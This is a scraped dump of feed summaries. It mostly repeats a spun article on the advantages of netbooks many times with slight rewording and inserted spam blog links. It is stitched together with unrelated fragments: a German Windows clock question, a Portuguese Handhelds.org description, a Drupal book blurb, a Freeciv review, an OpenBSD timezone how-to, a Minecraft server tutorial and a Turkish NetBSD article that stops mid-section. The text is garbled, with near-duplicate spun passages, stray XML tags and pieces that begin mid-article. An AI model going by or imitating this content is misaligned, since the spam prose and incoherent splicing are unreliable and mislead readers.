Designed with a 2.5 ", 5400 SATA drive, the netbook allows you to save any data you want while browsing the web. 
 
Advantage no. 6: Keyboard 
Being no more than it is, the netbook raises the keyboard issue: Could it be cramped? Does it slow down your progress? The truth is that, at the start, the laptop keyboard was nearly 80% of a laptop keyboard also it made a few difficulties in typing. Now you can find the improved models on the market, with bigger keyboards, that are 92% of the regular laptop's and allow you to type fast and simply. 
 
Advantage no. 7: Price 
Last, but not least, one of the main advantages the netbook has to offer is its low cost. Judging by the quality it provides, it is a good deal for just about any user. 
 
So, with all these pluses, there's no wonder netbook reviews just praise these little gadgets. And also there's no wonder more and more people are trading their every day laptop for a smaller, cheaper, better netbook, don't you think?]]></summary>

Netbooks are extremely light, small-sized laptops which are mainly employed for browsing the net, shopping on the web, chatting and taking advantage of the social networks. Most of the sites offering netbook reviews speak highly about the subject and they're becoming a lot more popular. Mostly, this happened due to a number of advantages that attracted the general public immediately: 
 
Advantage no.1: Size 
The small-sized netbook is always good to go anywhere you go. Place it inside your office briefcase, in your backpack when you go on a journey or perhaps in a bag, if you wish to take a walk. Practically, they fit anywhere, because of its special design, with a 7 to 12 inch screen, that takes up little room, but provides you with top quality. 
 
Advantage no. 2: Weight 
A netbook weighs 2.9 lbs., therefore you can transport it around without feeling you're actually carrying weight. It's light enough to become carried by children, by old people and through those who will often have many and/or heavy thing in it and want an easy computer. 
 
Advantage no. 3: Battery 
As it is designed for individuals who mainly browse the web, the battery is 3-4 cells or even 6 cells, on the newest models, in order to keep in touch for up to 8 hours. 
 
Advantage no. 4: Os's 
A netbook can operate any system you regularly find a pc: Windows, Linux, Google Chrome OS, Mac OS X yet others like FreeBSD, OpenBSD, Darwin and Moblin. 
 
[http://www.moselbook.de/index.php?p=blogs/viewstory/37770 find netbooks]  
 
Advantage no. 5: Storage 
Equipped with a 2.5 ", 5400 SATA drive, the netbook allows you to save data you would like while browsing the net. 
 
Advantage no. 6: Keyboard 
Being as small as it is, the netbook raises the keyboard issue: Could it be cramped? Does it slow down your progress? The fact is that, at the start, the laptop keyboard was nearly 80% of the laptop keyboard also it made a few difficulties in typing. Now you can discover the improved models available on the market, with bigger keyboards, that are 92% of a regular laptop's and allow you to type fast and easily. 
 
Advantage no. 7: Price 
Last, although not least, one of many advantages that the netbook has to offer is its low price. By the quality it provides, it's a great deal for just about any user. 
 
So, with all these pluses, there's no wonder netbook reviews just praise these little gadgets. And also there is no wonder more and more people are trading their every single day laptop for any smaller, cheaper, better netbook, don't you think?]]></summary>

Netbooks are extremely light, small-sized laptops which are mainly used for browsing the net, shopping on the web, chatting and using the social networks. Most of the sites offering netbook reviews speak highly about the subject and they're becoming more and more popular. Mostly, this happened due to a number of advantages that attracted the public right away: 
 
Advantage no.1: Size 
The small-sized netbook is definitely all set where you go. Place it inside your office briefcase, inside your backpack when you are on a journey or in a bag, if you want to take a walk. Practically, they fit anywhere, because of its special design, with a 7 to 12 inch screen, that takes up little room, but provides you with good quality. 
 
Advantage no. 2: Weight 
A netbook weighs 2.9 lbs., so that you can transport it around without feeling you're actually carrying weight. It is light enough to become carried by children, by old people and also by those who will often have many and/or heavy thing on them and need a light computer. 
 
Advantage no. 3: Battery 
As it is created for individuals who mainly see the web, battery is 3-4 cells or perhaps 6 cells, around the newest models, in order to stay connected for approximately 8 hours. 
 
Advantage no. 4: Os's 
A netbook can operate any system you regularly find a pc: Windows, Linux, Google Chrome OS, Mac OS X and others like FreeBSD, OpenBSD, Darwin and Moblin. 
 
[http://myarea.jaju.co.uk/blog/view/47516/find-netbooks netbooks]  
 
Advantage no. 5: Storage 
Designed with a 2.5 inch, 5400 SATA drive, the netbook allows you to save any data you want while browsing the net. 
 
Advantage no. 6: Keyboard 
Being as small as it is, the netbook raises the keyboard issue: Is it cramped? Does it slow down your progress? The truth is that, at the start, the keyboard was nearly 80% of a laptop keyboard also it made a few difficulties in typing. You can now find the improved models available on the market, with bigger keyboards, that are 92% of a regular laptop's and allow you to definitely type fast and simply. 
 
Advantage no. 7: Price 
Last, but not least, one of the main advantages that the netbook provides is its low cost. By the quality it offers, it's a great deal for any user. 
 
So, with all of these pluses, there is no wonder netbook reviews just praise these little gadgets. And also there is no wonder increasing numbers of people are trading their every single day laptop for any smaller, cheaper, better netbook, don't you think?]]></summary>

Uusi sivu  
 
Netbooks are extremely light, small-sized laptops which are mainly used for browsing the net, shopping on the web, chatting and taking advantage of the social networking sites. Most of the sites offering netbook reviews speak highly about them and they're becoming a lot more popular. Mostly, this happened because of a series of advantages that attracted the general public right away: 
 
Advantage no.1: Size 
The small-sized netbook is always all set anywhere you go. You can put it inside your office briefcase, in your backpack when you go on a journey or perhaps in a bag, if you wish to take a walk. Practically, they fit anywhere, thanks to its special design, having a 7 to 12 inch screen, that can take up little room, but gives you good quality. 
 
Advantage no. 2: Weight 
A netbook weighs 2.9 lbs., so that you can transport it around without feeling you're actually carrying weight. It is light enough to be carried by children, by old people and also by the ones who will often have many and/or heavy thing on them and need a light computer. 
 
Advantage no. 3: Battery 
Because it is created for individuals who mainly see the web, the battery is 3-4 cells or perhaps 6 cells, on the newest models, so as to keep in touch for up to 8 hours. 
 
Advantage no. 4: Operating systems 
A netbook can operate any system you frequently find a pc: Windows, Linux, Google Chrome OS, Mac OS X yet others like FreeBSD, OpenBSD, Darwin and Moblin. 
 
[http://community.ruto13.com/blog/view/105552/netbooks netbooks]  
 
Advantage no. 5: Storage 
Equipped with a 2.5 inch, 5400 SATA drive, the netbook enables you to save data you would like while browsing the net. 
 
Advantage no. 6: Keyboard 
Being no more than it's, the netbook enhances the keyboard issue: Could it be cramped? Will it slow down your progress? The truth is that, at the beginning, the laptop keyboard was nearly 80% of the laptop keyboard and it made a few difficulties in typing. Now you can find the improved models available on the market, with bigger keyboards, that are 92% of the regular laptop's and permit you to definitely type fast and simply. 
 
Advantage no. 7: Price 
Last, although not least, one of the main advantages the netbook has to offer is its low cost. By the quality it offers, it is a great deal for just about any user. 
 
So, with all these pluses, there is no wonder netbook reviews just praise these little gadgets. As well as there's no wonder more and more people are trading their every day laptop for a smaller, cheaper, better netbook, don't you think?]]></summary>

Equipped with a 2.5 ", 5400 SATA drive, the netbook enables you to save any data you want while browsing the web. 
 
Advantage no. 6: Keyboard 
Being as small as it's, the netbook raises the keyboard issue: Is it cramped? Will it slow down your progress? The fact is that, at the beginning, the keyboard was nearly 80% of the laptop keyboard and it created a few difficulties in typing. You can now discover the improved models available on the market, with bigger keyboards, which are 92% of the regular laptop's and allow you to definitely type fast and easily. 
 
Advantage no. 7: Price 
Last, but not least, one of the main advantages that the netbook provides is its low price. Judging by the standard it offers, it is a great deal for just about any user. 
 
So, with all these pluses, there's no wonder netbook reviews just praise these little gadgets. And also there is no wonder increasing numbers of people are trading their every day laptop for a smaller, cheaper, better netbook, no?]]></summary>

Because it is created for individuals who mainly see the web, the battery is 3-4 cells or perhaps 6 cells, on the newest models, so as to keep in touch for up to 8 hours. 
 
Advantage no. 4: Operating systems 
A netbook can operate any system you frequently look for a pc: Windows, Linux, Google Chrome OS, Mac OS X and others like FreeBSD, OpenBSD, Darwin and Moblin.

Advantage no. 5: Storage 
Equipped with a 2.5 inch, 5400 SATA drive, the netbook allows you to save any data you want while browsing the web. 
 
Advantage no. 6: Keyboard

Advantage no. 7: Price 
Last, but not least, one of many advantages that the netbook provides is its low price. Judging by the quality it offers, it is a great deal for just about any user. 
 
So, with all these pluses, there's no wonder netbook reviews just praise these little gadgets. As well as there's no wonder more and more people are trading their every single day laptop for any smaller, cheaper, better netbook, no?]]></summary>

Nowa strona  
 
Netbooks are very light, small-sized laptop computers which are mainly used for browsing the net, shopping on the web, chatting and taking advantage of the social networking sites. Most of the sites offering netbook reviews speak highly about them and they are becoming more and more popular. Mostly, this happened because of a series of advantages that attracted the general public right away: 
 
Advantage no.1: Size 
The small-sized netbook is definitely all set where you go. You can put it inside your office briefcase, inside your backpack when you are on a journey or perhaps in a bag, if you want to go for a walk. Practically, they fit anywhere, because of its special design, with a 7 to 12 inch screen, that can take up little room, but provides you with top quality. 
 
Advantage no. 2: Weight 
A netbook weighs 2.9 lbs., therefore you can carry it around without feeling you're actually carrying weight. It is light enough to be carried by children, by old people and through those who usually have many and/or heavy thing on them and want a light computer. 
 
Advantage no. 3: Battery

Advantage no. 4: Operating systems 
A netbook can operate any system you regularly find a pc: Windows, Linux, Google Chrome OS, Mac OS X and others like FreeBSD, OpenBSD, Darwin and Moblin.

Advantage no. 5: Storage 
Equipped with a 2.5 ", 5400 SATA drive, the netbook allows you to save any data you want while browsing the net. 
 
Advantage no. 6: Keyboard 
Being no more than it's, the netbook enhances the keyboard issue: Is it cramped? Does it slow you down? The fact is that, at the beginning, the laptop keyboard was nearly 80% of the laptop keyboard also it created a few difficulties in typing.

Advantage no. 7: Price 
Last, but not least, one of the main advantages that the netbook provides is its low cost. By the quality it offers, it's a great deal for any user. 
 
So, with all these pluses, there's no wonder netbook reviews just praise these little gadgets. As well as there is no wonder increasing numbers of people are trading their every day laptop for any smaller, cheaper, better netbook, don't you think?]]></summary>

  <summary><![CDATA[Frage von Lieschen Müller: Wieso zeigt Windows immer die falsche Zeit an? 
Beim Einschalten kommt immer so eine Menü, wo man drei Sachen auswählen kann: 
Debian GNU/Linux 
OpenBSD 
Windows XP 
Bei den ersten beiden wird die Zeit richtig angezeigt, aber Windows geht immer zwei Stunden nach. Wenn ich die Zeit richtig einstelle, ist sie am nächsten Tag wieder um zwei Stunden verstellt. Weiß einer woran das liegt und wie man das ändern kann? 
Früher hatte ich das nie, aber leider ist mein eigener Computer kaputt und ich mußte Windows auf dem PC von meinem Freund installieren und seitdem ist das so. Kann man das irgendwie richtig einstellen, ohne etwas zu “verpfuschen”? 
Die Zeitzone ist richtig eingestellt und ich habe die Uhr auch schon ein paar Mal richtig eingestellt bzw. “Jetzt aktualisieren” angeklickt. Aber spätestens am nächsten Tag ist sie eben wieder verstellt, immer um 2 Stunden. 
Beste Antwort: 
Answer by Kleine_Anne Eine sehr interessante Frage, die ich mir auch schon stelle. 
Bei mir ist es allerdings Linux..

  <summary><![CDATA[O modelo de fonte aberta incentiva a produção e desenvolvimento de produtos de software que promovem o acesso aos materiais do produto original de origem - normalmente, o código fonte do software. Durante décadas, o software de código aberto tem sido fácil de adquirir para operar plataformas de sistemas para computadores pessoais. Nos últimos anos, o movimento foi realizado para se concentrar na criação de soluções de software de código aberto para todas as plataformas de computação, incluindo aqueles usados ​​por dispositivos de computador de mão.   Handhelds.org é um site dedicado ao movimento do software livre, com foco especificamente em sistemas de computadores portáteis e de mão. O objetivo da Handhelds.org é incentivar o desenvolvimento de soluções de software de código aberto para plataformas de computação portátil. O site fornece suporte para várias classes de usuários:   * Os desenvolvedores de sistemas de software que trabalham para converter os sistemas operacionais e as capacidades de infra-estrutura associadas a novos itens de computação portátil.   * Projetistas de aplicativos que criam software de aplicação para rodar no hardware e plataformas de sistemas operacionais suportados pelo Handhelds.org.   * Os usuários finais, que irão utilizar o software criado pelos magos do sistema, bem como os projetistas de aplicações. Handhelds.org encoraja a mais ampla distribuição e uso possível para o software que está disponível em seu site.   Handhelds.org apoia o desenvolvimento de software para qualquer dispositivo que possa ser considerado como um computador portátil. Eles são independentes de quaisquer produtos e arquiteturas; desenvolvimento de software para qualquer tipo de computador portátil é bem-vindo. Quanto a sistemas operacionais, o foco sites é em sistemas com uma arquitetura de estilo Unix, como o Linux e as variações do Unix, como o FreeBSD, OpenBSD, NetBSD, e outros. Handhelds.org acredita que, com sistemas operacionais alternativos como estes, os melhores resultados de software a partir de um sentimento saudável e energético da concorrência.   O suporte para infra-estrutura de aplicação inclui estruturas de janelas, caneta e estratégias de entrada de voz, comunicação sem fio e similares, permitindo-chave projetos. Aplicações para dispositivos portáteis incluem uma coleção de expansão da auto-suficientes produtos e habilitados para Internet aplicações. O site encoraja os desenvolvedores a criar software que é independente de hardware e independente de sistemas operacionais específicos, sejam executados em todas as plataformas suportadas, que pode ser facilmente migrado para novas plataformas como eles se tornam disponíveis. O site fornece informações para designers e desenvolvedores, recursos para que os usuários se comunicar e coordenar os esforços, e um conjunto de repositórios para usuários de arquivar e distribuir software livre.   Handhelds.org acolhe e incentiva a participação de pessoas, grupos e empresas que compartilham de seus objetivos. Handhelds.org não fornece suporte formal para hardware ou software, e eles não oferecem software para a venda. Os proprietários do site incentivar os desenvolvedores a considerar a possibilidade de seu software para livre e, apesar de reconhecer que alguns desenvolvedores não podem aderir a um tal modelo de negócio, eles não fornecem os recursos para desenvolvedores que desejam vender e distribuir seu software online. Os projetos podem incluir tanto os esforços individuais, bem como de trabalho que são organizados e / ou patrocinados por indivíduos, grupos ou empresas. O único requisito para participar é que os resultados devem ser disponibilizados como software de código aberto....]]></summary>

  <title><![CDATA[What Are the Advantages of a Netbook?]]></title>
  <summary><![CDATA[Netbooks are very light, small-sized laptop computers that are mainly used for browsing the web, shopping online, chatting and using the social networks. Many of the sites offering netbook reviews speak highly about them and they are becoming more and more popular. Mostly, this happened because of a series of advantages that attracted the public right away: 




Advantage no.1: Size 
 The small-sized netbook is always good to go anywhere you go. You can put it in your office briefcase, in your backpack when you go on a holiday or in a bag, if you want to take a walk. Practically, it fits anywhere, thanks to its special design, with a 7 to 12 inch screen, that takes up little room, but gives you good quality. 
Advantage no. 2: Weight 
 A netbook weighs 2.9 lbs., therefore you can carry it around without feeling you're actually carrying weight. It is light enough to be carried by children, by old people and also by the ones who usually have many and/or heavy thing on them and need a light computer. 
  
  What Are the Advantages of a Netbook?


Advantage no. 3: Battery
 As it is designed for people who mainly browse the web, the battery is 3-4 cells or even 6 cells, on the newest models, so as to stay connected for up to 8 hours. Advantage no. 4: Operating systems 
 A netbook can operate any system you regularly find a personal computer: Windows, Linux, Google Chrome OS, Mac OS X and others like FreeBSD, OpenBSD, Darwin and Moblin. Advantage no. 5: Storage 
 Equipped with a 2.5 inch, 5400 SATA drive, the netbook allows you to save any data you want while browsing the web. Advantage no. 6: Keyboard 
 Being as small as it is, the netbook raises the keyboard issue: Is it cramped? Does it slow you down? The truth is that, at the beginning, the keyboard was nearly 80% of a laptop keyboard and it created a few difficulties in typing. Now you can find the improved models on the market, with bigger keyboards, that are 92% of a regular laptop's and allow you to type fast and easily. Advantage no. 7: Price
 Last, but not least, one of the main advantages that the netbook has to offer is its low price. Judging by the quality it offers, it's a great deal for any user. So, with all these pluses, there's no wonder netbook reviews just praise these little gadgets. And also there's no wonder more and more people are trading their every day laptop for a smaller, cheaper, better netbook, don't you think?

Drupal is free to download and use, and is suitable both for small and large dynamic content sites.Drupal is a free and open source modular framework and content management system (CMS) written in the programming language PHP. Like many modern CMSs, Drupal allows the system administrator to create and organize content, customize the presentation, automate administrative tasks, and manage site visitors and contributors.Drupal is sometimes described as a "Content Management Framework"as its capabilities extend from content management to enabling a wide range of services and transactions. Although Drupal does offer a sophisticated programming interface, basic web site installation and administration can be accomplished with no programming.Drupal runs in many environments, including Windows, Mac OS X, Linux, FreeBSD, OpenBSD, Solaris 10, OpenSolaris and any platform that supports either the Apache (version 1.3+), or IIS (version IIS5+) Web server and the PHP language (version 4.3.5+). Drupal requires a database such as MySQL or PostgreSQL to store content and settings.This book gives you insights in the techniques and technologies for building successful websites and online communities.You will learn about this powerful free software's ins and outs, become a community-building expert and examine successful Drupal sites. Get this book if you're a web professional, developer, designer, and decision maker interested in applying Drupal knowledge.This book covers an excellent introduction to the nuts-and-bolts of architecting and building Drupal sites. Examine dissections of some of the most popular Drupal sites out there and learn about important topics such as the processes for building and growing successful Drupal websites.]]></summary>

  <title><![CDATA[Freeciv on FreeBSD]]></title>
  <summary><![CDATA[Quite some time ago I worked at a radio telescope for 3 months as part of my work experience for my engineering degree. During that time I had an incredibly old machine as my work station, it was an original Pentium running at 77 Mhz. Because it was so old and because of the job I was doing I installed Linux on it. I used my favourite old school window manager (FVWM) and had it set up pretty sweet. 
One of my duties for a short period of time was looking after the telescope after hours. This was called being the duty astronomer and was something everyone did at sometime during the year. Basically you were on call for if something happened to the equipment that the remote astronomer couldn’t handle. Most of the people using the telescope were often some distance away and did observations remotely thanks to the power of the net. 
So I was spending many hours at my workstation after work hours, not working, and watching the telescope and waiting for something to happen. This is when I installed freeciv and started playing. Surprisingly even on that hideously old machine the game played quite well and was quite enjoyable. 
Recently I compiled and installed it on my sun fire R280 machine which is running FreeBSD. The machine is headless so I was accessing the machine via XDMCP in order to play. There are too many graphics to play the game via a VPN connection, but it works very well over a LAN connection, mine is 100Mbps so it would be significantly better on gigabit. 
I was playing on the standard GTK based client, but there are other clients with support for the Xaw, Xaw3d and SDL toolkits so you can get it to work on systems without GTK installed. Most of the clients look pretty much the same with the exception of the SDL client which imitates the interface of the newer civilization games. 
The graphics for units and the terrain are consistent across all the clients so you won’t be confused trying to identify units or terrain. There are several tile-sets to choose from as well so you can customise the way the game looks. Unfortunately the newer versions of freeciv don’t have as many tile-sets available as the older ones. Some times I have found some of the text is difficult to read because it is so small. 
If your platform supports sound there are some sound effects for events such as combat. On the sun machine I didn’t have sound, however I do have it working on my macbook running the SDL client for freeciv. The sound is reasonably good, but not essential to game play. There isn’t any music in the game, but this leaves you room to play some of your own. 
The game play is of course very much like civilization. The default rules most resemble the rules of civilization II with some differences. There are different rule sets that you can use, for instance there is a rule set for the first civilization game. There are unfortunately many subtle differences in game play that may annoy some players. The main draw card here is that multiplayer games are supported. This is reflected in the way diplomacy works differently to the commercial games. 
Personally I actually prefer the original civ II game play, graphics and sound, but freeciv has some merit of its own. There are some features that are nice such as extremely large maps, and many more players in one game. The rules are subtly different which can change some of the strategies for play, but for the most part the same strategies will work. It still is fun to play for me, but it really will be a matter of personal preference as to whether you enjoy it or not.

  <title><![CDATA[How do I change time zone OpenBSD ?]]></title>
  <summary><![CDATA[Q. How do I configure or change time zone OpenBSD operating system?
A. All of the time zones OpenBSD supports are in the /usr/share/zoneinfo directory tree. You need to create symlink to /etc/localtime file. 
=> /usr/share/zoneinfo - time zone information directory 
=> /etc/localtime - local time zone file 
=> /usr/share/zoneinfo/posixrules - used with POSIX-style TZ’s (generally not required) 
=> /usr/share/zoneinfo/GMT - for UTC leap seconds 
Here is my current timezone – set to Asia / Calcutta (GMT +5:30): 
$ ls -l /etc/localtime 
Sample output: 
lrwxr-xr-x  1 root  wheel  33 Sep 19  2007 /etc/localtime -> /usr/share/zoneinfo/Asia/Calcutta
How do I change time zone?
You’ll see several subdirectories for various countries or continents, each containing either city names or local time zones. 
# ls /usr/share/zoneinfo/ 
Sample output: 
Africa     Atlantic   Canada     EST5EDT    Factory    GMT-0      Iceland    Japan      MST7MDT    Navajo     Portugal   UCT        WET        zone.tab
America    Australia  Chile      Egypt      GB         GMT0       Indian     Kwajalein  Mexico     PRC        ROC        US         Zulu
Antarctica Brazil     Cuba       Eire       GB-Eire    Greenwich  Iran       Libya      Mideast    PST8PDT    ROK        UTC        posix
Arctic     CET        EET        Etc        GMT        HST        Israel     MET        NZ         Pacific    Singapore  Universal  posixrules
Asia       CST6CDT    EST        Europe     GMT+0      Hongkong   Jamaica    MST        NZ-CHAT    Poland     Turkey     W-SU       right
Find the file for the time zone you like or for a city whose time zone you share. To set the time zone, just create a new symbolic link to the file from /etc/localtime. 
# ln -sf /usr/share/zoneinfo/America/New_York /etc/localtime 
Incoming search of time zone OpenBSD :

Your shell documentation
man pages ksh, bash, getconf, sysconf, sysctl, find, and xargs
vim keyboard shortcuts
Oracle errors
ORA-12154
time zone OpenBSD]]></summary>

  <title><![CDATA[Setting Up a Minecraft Server on Linux]]></title>
  <summary><![CDATA[This tutorial for how to set up a Minecraft server on Linux was designed for people who don’t have a lot of experience with Linux. There is a more advanced tutorial in the forums. This tutorial was tested on Ubuntu 9.10 32-bit but should work with the descendants of Debian. 
Downloading
Ensure you have the latest server application software. Look above for instructions. 
Installing Java
If you get java: command not found (which may be followed by more text) or if you do have another Java version than 1.6 then you need to install or update java. The official Oracle Java is recommended. A few individuals have experienced issues with OpenJDK. Others report that running on OpenJDK is completely fine. 
Debian
Ensure that the non-free repository is being scanned by apt. You do this by adding non-free to your/etc/apt/sources.list file. e.g.: 
deb http://ftp.uk.debian.org/debian/ squeeze main non-free
Update your sources list (as root): 
apt-get update
Then to install Java, simply type this in terminal and press enter (as root): 
apt-get install sun-java6-jre
Ubuntu
Unfortunately, as stated at the bottom of this section, some licensing issues have prevented Canonical from allowing repositories to have Sun Java, so you must download it directly from Oracle, package it, and install it. Luckily, there is a nice script that is fairly easy to use at this link. Just run the commands below, and if you have any troubles just go to the link. It may take a while. 
cd ~/ 
wget https://raw.github.com/flexiondotorg/oab-java6/master/oab-java.sh -O oab-java.sh 
 
chmod +x oab-java.sh 
 
sudo ./oab-java.sh 
If you want to watch progress, just run 
tail -f ./oab-java.sh.log 
Then, once the script has finished, run 
sudo apt-get install sun-java6-jre 
Pretty much everything below this in this section won’t work any longer. I don’t want to delete it until it is all tested again though. 
For Ubuntu 10.04 LTS and on, the sun-java6 packages have been dropped from the Multiverse section of the Ubuntu archive. You must add these sources: 

For Ubuntu 10.04 LTS (Lucid Lynx):

sudo add-apt-repository "deb http://archive.canonical.com/ lucid partner" 

For Ubuntu 10.10 (Maverick Meerkat):

sudo add-apt-repository "deb http://archive.canonical.com/ubuntu maverick partner" 

For Ubuntu 11.04 (Natty Narwhal):

Some distros have the command “add-apt-repository” removed. If this is the case, you will need to add the python properties by running the following command: 
sudo apt-get install python-software-properties 
Then you can proceed to add the source: 
sudo add-apt-repository "deb http://archive.canonical.com/ubuntu natty partner" 

For Ubuntu 11.10 (Oneiric Ocelot):

Some distros have the command “add-apt-repository” removed. If this is the case, you will need to add the python properties by running the following command: 
sudo apt-get install python-software-properties 
Then you can proceed to add the source: 
sudo add-apt-repository ppa:ferramroberto/java 

Then install the packages:

sudo apt-get update 
sudo apt-get install sun-java6-jre 
sudo update-alternatives --config java 

Note that after February 16, 2012 the above may no longer work thanks to a licensing issue with Sun’s Java ( https://lists.ubuntu.com/archives/ubuntu-security-announce/2012-January/001554.html )

openSUSE
On older versions, you can simlpy type zypper in java-1_6_0-sun into a terminal. 
On newer versions, there is a tutorial here describing how to install Java. 
Arch Linux
Open a terminal and run pacman -S openjdk6 as root. 
Gentoo
Use: emerge virtual/jre 
Other distros
Alternatively, you can visit Java’s website directly to download the Java package for Linux. Most distros work with this (either 32 or 64-bit). Instructions for the installation of those different packages are given on the site. 
If during installation, it asks for a password, enter your password. If you get asked “Is this OK [Y/N]” Enter Y and press enter if required. Java should now be installed. 
Start the Minecraft server
Open the terminal again Applications > Accessories > Terminal Enter the following commands, substituting ‘minecraft_server’ with the name of the folder you extracted the server to: 
cd minecraft_server 
java -Xms1G -Xmx1G -jar minecraft_server.jar nogui 
Less than 1GB free RAM
If you have less than 1024MB RAM, the above line may cause problems with swapping and out of memory conditions, which makes the game hard to play. 
cd minecraft_server 
java -Xms1G -Xmx1G -jar minecraft_server.jar nogui 
free -m It may look like this: 
 
You are interested in the last number in the third line, 2163 in this case. Subtract some RAM as safety. On this computer, the server may use up to 1536 MB RAM. Now, replace the 1024 in the above example with the calculated number: 
java -Xms1536M -Xmx1536M -jar minecraft_server.jar nogui 
Voila, it should run smoothly now 
Tip: If you want to spare more memory, you may set the -Xms parameter even lower, say: 
java -Xms32M -Xmx512M -jar minecraft_server.jar nogui 
The parameter controls how much memory is reserved on startup Your server will start with 32MB RAM and whenever it needs more memory it will allocate some until it reaches the maximum of 512 MB. However, this will result in a little slowdown whenever the allocation is done. 
Startup and maintenance script
Alternatively you can manage/automate the startup and shutdown of the Minecraft server using a script such as the ones listed below: 

Minecraft Server Manager A comprehensive start up script for Minecraft and Bukkit servers (support Debian, such as Ubuntu).

MSM can also periodically create World Edit compatible backups.
Keeps players informed with configurable in-game messages, such as “Shutting down in 10 seconds!”
Expose in-game commands (such as “say”, “op” and “whitelist”) to the terminal.
Tab completion on all commands makes learning easy.
Visit Minecraft Server Manager’s GitHub page for the full list of features.


Server startup script
M3tal Warrior’ Server Startup Script

For Debian (and should work on Ubuntu too); Bukkit and Vanilla compatible
Full backup and rollback routines
All ingame commands can be invocated
Supports using the RAM as server root file system
Multiple cron invocations to ease administration
Easy autoupdater
Easy installer for first timers


FreeBSD startup script
OpenBSD startup script
Ubuntu startup script

Configure and connect
Now it is time to configure and connect.]]></summary>

  <title><![CDATA[NetBSD Nedir?]]></title>
  <summary><![CDATA[UNIX kullanıcıları BSD iletim sistemi ailesini çok iyi bilir. Herhangi bir UNIX kullanıcısı için FreeBSD, OpenBSD, NetBSD ve DragonflyBSD bu ailenin başlıca üyeleridir. UNIX kullanıcılar için BSD işletim sistemi ailesi iyi bilinse de diğer kullanıcılar için BSD işletim sistemi ailesinin  üyeleri tanınmaz. NetBSD söz konusu olduğunda UNIX kullanıcıları dışında bilinilirliği yok denecek kadar azdır. NetBSD tanınmasa da günlük yaşamda farklı donanımlar ve cihazlar üzerinde NetBSD kullanılır. BSD işletim sistemi ailesi farkında olmadan kullanılan en yaygın işletim sistemlerinden olmakla birlikte tanınmasının bu deneli az olması BSD işletim sistemi ailesinin ticari olarak pazarlanmamasıdır. Özellikle de söz konusu olan NetBSD ise sitesinde de yazıldığı gibi medyada el üstünde tutulan, sık sık adı geçen bir sistem arıyorsanız başka yere bakmanız gerekir.
 
 
 

NetBSD diğer BSD işletim istemi ailesinin üyeleri ile karşılaştırıldığında aktarılabilirlik, doğru yazılmış kaynak kodu, düşük kaynak gereksinimi, özgür, yazılım yönetiminin kolaylığı, araştırma ve geliştirmeye açık yapısı dikkat çeker.

 

Aktarılabilirlik

 

UNIX aktarılabilir bir işletim sistemidir. Bu özelliği “Aktarılabilir İşletim Sistemi Standardı” olarak bilinen “Portable Operating System Interface for UNIX” ortaya çıkarmıştır. NetBSD aktarılabilirlik söz konusu olduğunda UNIX dünyasının lideridir. NetBSD bugün için 57 farklı platformda, 17 farklı işlemci mimarisi üzerinde çalışabilmektedir. Bu platformlar arasında arm işlemcili sistemler, gömülü sistemler, hatta VAX'tan ATARI'ya kadar bir çok donanım platformu sayılabilir. Güncel ve tam listeye NetBSD sitesinden erişilebilir.

 

Doğru Yazılmış Kaynak Kodu

 

Yazılım geliştiriciler arasında yaygın olarak kabul gören bir görüş vardır. “Eğer çalışıyorsa, kod doğru demektir.” Bunu biraz açacak olursak, eğer yazılım iyi kötü çalışıyorsa demek ki kaynak kod doğru yazılmış demektir. NetBSD geliştiricileri için ise tam tersi geçerlidir. Kaynak kodu doğru yazıyorsanız doğru çalışır diyebiliriz. Geliştiriciler yazılan kaynak kodun hatasız, gereksiz kodlardan ve özelliklerden arınmış olarak yazılması gerektiğini düşünür. Gereksiz eklemeler ile şişen kaynak kodun sonunda kendi karmaşıklığı ve ağırlığı altında hata vereceği ve çökeceği açıktır. NetBSD sürümleri için açılan hata kayıtları bildiğiniz işletim sistemleri ile kıyaslanırsa yok denecek kadar azdır. Dolayısıyla da güvenlik zayıflıkları açısından bakıldığında en güvenilir işletim sistemlerinden birisi olarak karşınıza çıkar. Bunun nedeni NetBSD geliştiricilerin doğru kod yazımına ilişkin felsefeleridir. NetBSD için doğru yazılmış kod doğru çalışır ve sonuçta farklı bir platforma aktarılmak istenildiğinde üzerinde az değişiklik yapılarak aktarılabilir. 

 

Düşük Kaynak Gereksinimi

 

NetBSD diğer işletim sistemleri ile karşılaştırıldığında kaynak gereksinimi açısından oldukça mütevazi olduğu görülebilir. 57 farklı platformda çalışan bir sistem için bu normal bir durumdur. NetBSD minimum sistem gereksinimi platforma ve kullanım amacınıza göre değişkenlik gösterecektir. Temel sistemi tüm bileşenleri ile PC üzerinde kuruyorsanız disk alanı olarak 1 GB yeterli olacaktır. NetBSD desteklediği platformlardan birisine kuracak iseniz, sistem gereksinimleri o platforma ait kurulum belgelerinde belirtilmektedir. NetBSD sistem gereksinimi konusunu anlatmak için en güzel örnek elektrikli tost makinesine yapılmış NetBSD kurulumudur. :) Yapabiliyorsanız benzer donanımları kullanarak buzdolabınıza, çamaşır makinesine veya elinizin altındaki herhangi bir beyaz veya kahverengi eşyaya kurulum yapabilirsiniz. >:)

 

Özgür

 

NetBSD, BSD lisansı ile gelir. Her ne kadar NetBSD, derleyici olarak GNU araçlarını kullanmakta olsa da BSD lisansı ile dağıtılır. HNU araçları genel kamu lisansını kullanmakta olsa da NetBSD kaynak kodları BSD lisansı ile dağıtılır. GNU yazılımları da kendi GPL lisansını taşır ve bu şekilde dağıtıma dahil edilir. BSD işletim sistemi ailesinin geliştiricileri ve kullanıcılar için kaynak kodu nasıl kullanacağınız sizin kararınızdır. Bu konuda ne geliştiriciler ne de kullanıcılar size bir koşul dayatmaz. Aksi sizin özgür iradenizin kısıtlanması anlamına gelir. NetBSD istediğiniz gibi kullanabilirsiniz. Keyfinize bakın. 

 

Yazılım Yönetiminin Kolaylığı

 

UNIX sistemlerde yazılım yönetmek, gerek kaynak koddan derleyerek gerek doğrudan derlenmiş kodu kurmak, kaldırmak veya güncellemek için çeşitli araçlar kullanılır. NetBSD, FreeBSD ve OpenBSD ports benzeri pkgsrc bir yapı olan pkgsrc kullanır. Pkgsrc kullanarak yazılımı ister kaynak kodunu derleyebilir isterseniz önceden hazırlanmış olan derlenmiş ve kuruluma hazır haldeki paketleri kullanabilirsiniz. Pksgsrc yazılımı kurmayı, güncellemeyi kolaylaştırır.

 

Araştırma ve Geliştirmeye Açık Yapı

 

